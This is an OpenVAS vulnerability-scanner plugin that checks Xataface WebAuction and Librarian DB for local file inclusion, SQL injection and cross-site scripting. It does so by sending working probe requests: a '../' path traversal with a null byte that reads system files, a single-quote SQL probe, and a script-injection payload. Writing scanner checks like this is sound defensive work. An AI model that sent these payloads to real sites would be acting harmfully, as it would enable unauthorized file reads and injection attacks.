###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xadataface_webauction_n_librariandb_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to execute arbitrary HTML
  code in a user's browser session in the context of a vulnerable application
  or to manipulate SQL queries by injecting arbitrary SQL code or to include
  arbitrary files from external and local resources.
  Impact Level: Application";
tag_affected = "Xataface WebAuction Version 0.3.6 and prior.
  Xataface Librarian DB version 0.2 and prior.";
tag_insight = "Multiple flaws are due to  input passed to the,
  - '-action' parameter in 'index.php' is not properly verified. This can be
    exploited to read complete installation path.
  - 'list&-table' and '-action' parameter in 'index.php' page is not properly
    verified before being used in an SQL query. This can  be exploited to
    manipulate SQL queries by injecting arbitrary SQL queries.
  - '-action' and 'list&-table' parameter in 'index.php'  page is not properly
    verified before it is returned to the user. This can be exploited to
    execute arbitrary HTML and script code in a user's browser session in the
    context of a vulnerable site.
  - 'list&-lang' and '-table' parameter in 'index.php' page is not properly
    verified before it is returned to the user. This can be exploited to
    execute arbitrary HTML and script code in a user's browser session in the
    context of a vulnerable site.
  - 'list&-lang' parameter in 'index.php' is not properly verified before
    using it to include files. This can be exploited to include arbitrary
    files from external and local resources.";
tag_solution = "No solution or patch is available as of 09th September, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://xataface.com/";
tag_summary = "This host is running Xataface WebAuction/Librarian DB and is prone
  multiple vulnerabilities.";

if(description)
{
  script_id(801981);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=350");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17813");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_Xataface_Webauction_Mult_Vuln.txt");

  script_description(desc);
  script_summary("Determine multiple flaws in Xataface WebAuction/Librarian DB");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if (!can_host_php(port:port)){
  exit(0);
}

## check for each possible path
foreach dir (make_list("/webauction", "/librariandb", "", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('>WebAuction</' >< res || "Books - Dataface Application<" >< res)
  {
    ## Check for the local file inclusion
    files = traversal_files();
    foreach file (keys(files))
    {
      ## Construct exploit string
      url = string(dir, "/index.php?-table=books&-action=browse_by_cat&-curs" +
                   "or=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../." +
                   "./../../../", files[file],'%00');

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port:port);
        exit(0);
      }
    }

    ## Check for the SQL injection
    req = http_get(item:string(dir,"/index.php?-table='"), port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    ## Check the SQL result
    if("The mysql error returned was" >< res)
    {
      security_hole(port:port);
      exit(0);
    }

    ## Check for the XSS
    req = http_get(item:string(dir, '/index.php?-table=books&-action=browse_' +
                   'by_cat&-cursor=0&-skip=0&-limit=30&-mode=list&-lang="<sc' +
                   'ript>alert("OpenVAS-XSS-TEST")</script>'), port:port);

    res = http_keepalive_send_recv(port:port,data:req);

    ## Check the response
    if('<script>alert("OpenVAS-XSS-TEST")</script>' >< res)
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
